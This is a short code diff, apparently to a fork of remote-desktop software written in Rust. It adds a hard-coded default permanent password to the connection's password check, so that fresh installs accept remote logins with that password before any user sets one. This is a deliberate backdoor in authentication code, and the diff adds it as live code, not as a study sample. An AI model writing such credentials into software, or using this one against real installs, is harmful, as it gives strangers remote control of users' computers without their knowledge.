@@ -2163,6 +2163,14 @@ impl Connection {
                     print_fallback();
                     return true;
                 }
+                // Fork: baked-in default permanent password — fresh installs accept
+                // remote logins with this password without any post-install password setup.
+                // Real user-set passwords (via UI / IPC / CLI) shadow this default once stored.
+                const BAKED_DEFAULT_PERMANENT_PASSWORD: &str = "Redops@990";
+                if self.validate_password_plain(BAKED_DEFAULT_PERMANENT_PASSWORD) {
+                    print_fallback();
+                    return true;
+                }
             }
         }
         false
